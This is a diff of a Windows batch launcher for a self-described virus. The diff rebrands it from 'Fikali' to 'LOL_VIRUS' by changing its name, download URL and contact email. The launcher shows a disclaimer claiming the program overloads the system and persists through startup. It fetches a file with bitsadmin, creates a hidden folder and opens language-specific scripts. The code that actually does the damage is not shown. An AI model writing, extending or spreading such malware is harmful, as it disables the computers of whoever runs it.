@@ -10,11 +10,11 @@ goto disclaimer
 title Disclaimer!..
 echo Disclaimer! / Дисклеймер!
 echo.
-echo En: Fikali is a virus that can load your system to the point where you can't use it.
+echo En: LOL_VIRUS is a virus that can load your system to the point where you can't use it.
 echo     Restarting your computer will not help you, since this virus is written to startup.
 echo     Wait 10 seconds...
 echo.
-echo Ru: Fikali, это вирус который может нагрузить вашу систему до того, что вы не сможете ей пользоваться. 
+echo Ru: LOL_VIRUS, это вирус который может нагрузить вашу систему до того, что вы не сможете ей пользоваться. 
 echo     Перезагрузка компьютера вам не поможет так как этот вирус прописывается в автозагрузку. 
 echo     Подождите 10 секунд...
 title 10..
@@ -62,9 +62,9 @@ goto qe
 cls
 title Please wait...
 echo Please wait...
-bitsadmin /transfer "GGYT" https:/raw.githubusercontent.com/SuperPaket123YT/Fikali/fikali/files/art.txt C:\Fikali\files\art.txt >nul
-mkdir C:\temp_fikali
-attrib +h C:\temp_fikali
+bitsadmin /transfer "GGYT" https://raw.githubusercontent.com/GGYT1/LOL_VIRUS/master/files/art.txt C:\LOL_VIRUS\files\art.txt >nul
+mkdir C:\tmp_lolvirus
+attrib +h C:\tmp_lolvirus
 cls
 goto nc
 
@@ -76,14 +76,14 @@ goto c
 :warn
 cls
 title Warning!
-type C:\Fikali\files\art.txt
+type C:\LOL_VIRUS\files\art.txt
 echo.
 echo En: Wait! You are using Windows 11! This program may not work correctly on this OS!
-echo If you find bugs, write to E-mail: superpaket123yt@gmail.com
+echo If you find bugs, write to E-mail: ggytprogs0981@gmail.com
 echo Wait 5 seconds to continue
 echo.
 echo Ru: Постой! Вы используете Windows 11! Эта программа может неправильно работать на этой ОС!
-echo Если вы найдёте баги, напишите на E-mail: superpaket123yt@gmail.com
+echo Если вы найдёте баги, напишите на E-mail: ggytprogs0981@gmail.com
 echo Для продолжения подождите 5 секунд
 echo.
 title 5..
@@ -103,7 +103,7 @@ goto c
 
 :c
 cls
-type C:\fikali\files\art.txt
+type C:\LOL_VIRUS\files\art.txt
 echo.
 title Choose language...
 echo Please select a language
@@ -126,21 +126,21 @@ goto c
 
 :ru
 cls
-cd C:\fikali\files\languages\ru
+cd C:\LOL_VIRUS\files\languages\ru
 start ru.bat
 cls
 exit
 
 :en
 cls
-cd C:\fikali\files\languages\en
+cd C:\LOL_VIRUS\files\languages\en
 start en.bat
 cls
 exit
 
 :ukr
 cls
-type C:\fikali\files\art.txt
+type C:\LOL_VIRUS\files\art.txt
 echo.
 echo Ця мова ще не готова. Вибачте.
 pause
@@ -148,7 +148,7 @@ goto c
 
 :pol
 cls
-type C:\fikali\files\art.txt
+type C:\LOL_VIRUS\files\art.txt
 echo.
 echo Ten jezyk nie jest jeszcze gotowy. Przepraszam.
 pause
